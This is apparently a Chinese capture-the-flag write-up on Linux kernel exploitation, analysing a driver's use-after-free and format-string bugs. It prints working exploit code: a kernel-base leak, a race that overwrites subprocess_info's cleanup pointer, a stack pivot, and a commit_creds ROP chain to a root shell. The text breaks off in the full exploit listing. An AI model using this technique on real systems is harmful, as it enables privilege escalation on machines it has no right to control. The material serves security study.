<p>setsid /bin/cttyhack setuidgid 1000 /bin/sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这句设置我们登录的shell是1000用户组，为了调试方便，我们这里可以改成0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###  内核符号地址</span><br><span class="line"></span><br><span class="line">获取内核版本号</span><br><span class="line"></span><br><span class="line">![image-20211229114930507](.\image-20211229114930507.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当我们把shell权限设置成root后，就可以通过读取内核符号表的方式来获取到函数地址，命令为</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">cat /proc/kallsyms | grep func_name</span><br></pre></td></tr></table></figure></p>
<p>内核基地址的符号</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep startup_64</span><br></pre></td></tr></table></figure>
<p>驱动基地址的获取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/modules | grep driver_name</span><br></pre></td></tr></table></figure>
<h3 id="Kmalloc"><a href="#Kmalloc" class="headerlink" title="Kmalloc"></a>Kmalloc</h3><p>内核中申请内存一般是用kmalloc，kmalloc的标准分配方式很类似glibc的方式，也是把要分配的内存按大小划分成各种chunk，只不过内核中叫slab，同类的free slab也是按链表的方式链接在一起的</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229115149413.png" alt="image-20211229115149413"></p>
<p>题目中的这个分配函数是kmalloc中的内部函数</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229115227639.png" alt="image-20211229115227639"></p>
<p>根据请求的分配的内存大小，kmalloc_index获得该size对应的index，然后按index分配，一般来说，块的大小按2的阶计算，kmalloc_caches数组中的下标其实也是表示了块的大小即2^n字节，但是实际的如下图</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229115510775.png" alt="image-20211229115510775"></p>
<p>像exploit中比较常用的结构体，tty_operation是1024,cred结构体是192</p>
<p>针对freelist本身似乎也有一种exploit的方式，但是具体还有待研究</p>
<p><a href="https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank" rel="noopener">Kernoob: kmalloc without SMAP (kirin-say.top)</a></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>一般是用连接到qemu的方式调试，在启动脚本上加上-s</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229192830014.png" alt="image-20211229192830014"></p>
<p>然后gdb这边用下面命令就可以连接上去，但是调试内核有个问题是，如果装了gdb插件比如peda之类的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux -q</span><br><span class="line"></span><br><span class="line">&gt; target remote :1234</span><br></pre></td></tr></table></figure>
<p>调试倒也能调试，一个是非常慢，另一个会出错误，所以需要禁用掉插件，一般注释掉这个文件里的内容即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br></pre></td></tr></table></figure>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这个驱动没有read函数</p>
<p>IOCTL函数</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229180919038.png" alt="image-20211229180919038"></p>
<p>0x6666是释放申请的sctf_buf,这里释放之后并没有清空sctf_buf，存在UAF</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229181001609.png" alt="image-20211229181001609"></p>
<p>0x7777是打印sctf_buf里的内容，仔细看这里，是经典的格式化字符串漏洞的模式，这里做题的时候我竟然没考虑到</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229181116346.png" alt="image-20211229181116346"></p>
<p>0x5555 是给sctf_buf申请内存</p>
<p>write函数是往sctf_buf里面写入内容，这里特点是倒着写的</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229181454098.png" alt="image-20211229181454098"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先就是刚才提到的UAF，我们释放了sctf_buf之后没有清空，</p>
<p>申请内存块用的是</p>
<p>kmem_cache_alloc_trace(kmalloc_caches[7], 0xCC0LL);</p>
<p>对照前面的大小表，index为7的大小为128,一般这种UAF加slab的攻击方法是堆喷到内核中某个关键结构体，通过覆写其内容来exploit，这种攻击方式需要我们攻击的关键结构体的大小和我们这里能write的内存块是相同的index</p>
<p>这里关键结构体的选取已经有大佬做总结了，这里我参考pzhxbz的翻译</p>
<p><a href="http://pzhxbz.cn/?p=153" target="_blank" rel="noopener">（翻译）kernel pwn中能利用的一些结构体 – pzhxbz的技术笔记本</a></p>
<p>可以找到一个结构体叫subprocess_info,通过覆写其内容我们可以实现控制流劫持，只不过不知道是不是内核版本的不同，上文中提到的要覆写的位置和题目中内核是有出入的，下面我会给出分析</p>
<h3 id="subprocess-info"><a href="#subprocess-info" class="headerlink" title="subprocess_info"></a>subprocess_info</h3><p>结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">char</span> **argv;</span><br><span class="line">    <span class="keyword">char</span> **envp;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">// https://elixir.bootlin.com/linux/v4.19.98/source/include/linux/workqueue.h#L102</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line">    <span class="keyword">work_func_t</span> func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>触发方式为执行下面这句代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>socket会按下面的流程执行代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line">					 <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v5.11/source/kernel/umh.c#L472</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct subprocess_info *<span class="title">call_usermodehelper_setup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> **argv,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">char</span> **envp, <span class="keyword">gfp_t</span> gfp_mask,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>),</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">void</span> (*cleanup)(struct subprocess_info *info),</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">sub_info</span>;</span></span><br><span class="line">	<span class="comment">//创建subprocess_info</span></span><br><span class="line">	sub_info = kzalloc(<span class="keyword">sizeof</span>(struct subprocess_info), gfp_mask);</span><br><span class="line">	<span class="keyword">if</span> (!sub_info)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	INIT_WORK(&amp;sub_info-&gt;work, call_usermodehelper_exec_work);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_STATIC_USERMODEHELPER</span></span><br><span class="line">	sub_info-&gt;path = CONFIG_STATIC_USERMODEHELPER_PATH;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	sub_info-&gt;path = path;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	sub_info-&gt;argv = argv;</span><br><span class="line">	sub_info-&gt;envp = envp;</span><br><span class="line"></span><br><span class="line">	sub_info-&gt;cleanup = cleanup;</span><br><span class="line">	sub_info-&gt;init = init;</span><br><span class="line">	sub_info-&gt;data = data;</span><br><span class="line">  out:</span><br><span class="line">	<span class="keyword">return</span> sub_info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper_exec</span><span class="params">(struct subprocess_info *sub_info, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DECLARE_COMPLETION_ONSTACK(done);</span><br><span class="line">	<span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sub_info-&gt;path) &#123;</span><br><span class="line">		call_usermodehelper_freeinfo(sub_info);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">call_usermodehelper_freeinfo</span><span class="params">(struct subprocess_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (info-&gt;cleanup)</span><br><span class="line">		(*info-&gt;cleanup)(info);</span><br><span class="line">	kfree(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以如果我们能修改掉cleanup指针，就可以实现控制流劫持</p>
<p>在IDA中找到对应部分，可以看到应该修改的cleanup指针位于0x60也就是[12]的偏移处，至于info-&gt;path的值，实践后发现，这个值不用改，反正这题write也是倒着写的，所以我们只要改掉cleanup就行了</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229184006282.png" alt="image-20211229184006282"></p>
<p><img src="/2021/12/29/KernelPwn/image-20211229184023836.png" alt="image-20211229184023836"></p>
<h3 id="泄露kernel-base"><a href="#泄露kernel-base" class="headerlink" title="泄露kernel base"></a>泄露kernel base</h3><p>由于存在格式化字符串漏洞，所以直接打印栈上的值就可以leak base</p>
<p>不过这里也有个细节是泄露用的 %lld</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">"data : %lld %lld %lld %lld %lld \xff%lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld %lld\n"</span>);</span><br></pre></td></tr></table></figure>
<p>这里不能像做libc一样，用%p，因为printk的%p有拓展用法</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229184751883.png" alt="image-20211229184751883"></p>
<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>泄露完base之后我们利用条件竞争来劫持控制流到如下gadget</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229184948343.png" alt="image-20211229184948343"></p>
<p>这句代码可以实现栈迁移到用户空间，这里还有个小细节是，我们知道内核栈一般是0xffffffff开头的，如果我们直接mov esp，比如这里，rsp会变成0xffffffff83000000,栈依然在我们无法控制的内核空间中，所以为什么呢</p>
<p>这里其实用到了x64下的一个特性，mov esp，时会清空高位，所以我们赋值完之后，rsp 就等于 esp(太细节了orz)</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229185246441.png" alt="image-20211229185246441"></p>
<p>ROP布局代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup_chunk_rop</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop;</span><br><span class="line">        <span class="keyword">int</span> i = (<span class="number">0x1000000</span>/<span class="number">2</span>)/<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = kernel_base + (<span class="number">0xffffffff8108c360</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = kernel_base + (<span class="number">0xffffffff8108c780</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = kernel_base + <span class="number">0x16e9</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax = kernel_base + (<span class="number">0xffffffff813d7369</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_rep = kernel_base + (<span class="number">0xffffffff81aed04b</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rcx = kernel_base + (<span class="number">0xffffffff8101ed83</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_cr3_rdi = kernel_base + (<span class="number">0xffffffff8105734a</span> <span class="number">-0xffffffff81000000</span>); <span class="comment">//: mov cr3, rdi ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> or_rax_rdx = kernel_base + (<span class="number">0xffffffff81018d2c</span> <span class="number">-0xffffffff81000000</span>); <span class="comment">//: or rax, rdx ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx = kernel_base + (<span class="number">0xffffffff8104abb7</span><span class="number">-0xffffffff81000000</span>); <span class="comment">// pop rdx; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rax = kernel_base + (<span class="number">0xffffffff8100ec67</span><span class="number">-0xffffffff81000000</span>); <span class="comment">// pop rax; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rax_cr3 = kernel_base + (<span class="number">0xffffffff81057fab</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//: mov rax, cr3 ; mov cr3, rax ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mov_cr3_rax = kernel_base + (<span class="number">0xffffffff81057fae</span> - <span class="number">0xffffffff81000000</span>);<span class="comment">//: mov cr3, rax ; ret</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = kernel_base + (<span class="number">0xffffffff81c00f58</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = kernel_base + (<span class="number">0xffffffff81024f92</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore = kernel_base + (<span class="number">0xffffffff81c00e26</span> - <span class="number">0xffffffff81000000</span>);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   0xffffffff816e19bc:        mov    esp,0x83000000</span></span><br><span class="line"><span class="comment">                   0xffffffff816e19c1:        ret </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> pivot = kernel_base + <span class="number">0x6e19bc</span>;</span><br><span class="line">        rop = mmap(<span class="number">0x83000000</span>-(<span class="number">0x1000000</span>/<span class="number">2</span>), <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        rop[<span class="number">0</span>] = <span class="number">0xdeadbeaf</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;(<span class="number">0x1000000</span>/<span class="number">2</span>)/<span class="number">8</span>;)</span><br><span class="line">                rop[i++] = <span class="number">0xffffffff816e19bc</span>;</span><br><span class="line">        <span class="comment">//rop[i++] = mov_rax_cr3;</span></span><br><span class="line">        <span class="comment">//rop[i++] = pop_rdx;</span></span><br><span class="line">        <span class="comment">//rop[i++] = 0x1000;</span></span><br><span class="line">        <span class="comment">//rop[i++] = or_rax_rdx;</span></span><br><span class="line">        <span class="comment">//rop[i++] = mov_cr3_rax;</span></span><br><span class="line">        rop[i++] = pop_rdi;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = prepare_kernel_cred;</span><br><span class="line">        rop[i++] = pop_rcx;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = mov_rdi_rax_rep;</span><br><span class="line">        rop[i++] = commit_creds;</span><br><span class="line">        rop[i++] = swapgs_restore;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = <span class="number">0</span>;</span><br><span class="line">        rop[i++] = shell;</span><br><span class="line">        rop[i++] = tf.cs;</span><br><span class="line">        rop[i++] = tf.rflags;</span><br><span class="line">        rop[i++] = tf.rsp;</span><br><span class="line">        rop[i++] = tf.ss;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ROP fake stack %p\n"</span>, rop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到我们就是在0x83000000的位置布局的rop，这里为什么要在0x8300 0000前后都分配内存，因为</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229185627569.png" alt="image-20211229185627569"></p>
<p>ROP链是经典的布置了，基本上都是这样，没什么好说的，找到地址填上去就行了</p>
<p>条件竞争的部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ret = ioctl(fd, UAF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">assert(ret == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">pthread_create(&amp;tid, <span class="literal">NULL</span>, memset_buf, kernel_base + <span class="number">0x6e19bc</span>);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1</span>; i++)</span><br><span class="line"></span><br><span class="line">        ret = socket(<span class="number">22</span>, AF_INET, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//write(fd, buf, 0x20);</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>);</span><br><span class="line"></span><br><span class="line">lock = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>先free掉内存，然后创建一个线程,不停的往其0x60位置写入stack pivot的gadget,因为其实倒着写的，所以这里其实用的是0x80 - 0x60 = 0x20</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset_buf</span><span class="params">(<span class="keyword">void</span> *tmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> buf[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">                buf[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        char buf[0x81];</span></span><br><span class="line"><span class="comment">        memset(buf, 'M', 0x80);</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        lock = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                write(fd, buf, <span class="number">0x20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面用socket去创建subprocess_info，只要能在创建subprocess_info后，cleanup前写入gadget就能成功，出乎意料，这个成功率还是很高的。</p>
<p>这里还有个小问题是，因为新开的线程会不停的写入值，因为会不停的打印write，我们获得的shell能够正常使用吗(被write的log信息干扰)，这里实际打过后会发现可以正常获得shell的，我猜测跟shell的前台进程和后台进程有关，execve(“/bin/sh”)执行后，这个新进程就变成前台进程了，因此write的log信息并不会显示出来</p>
<p><img src="/2021/12/29/KernelPwn/image-20211229190828951.png" alt="image-20211229190828951"></p>
<p>完整的exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 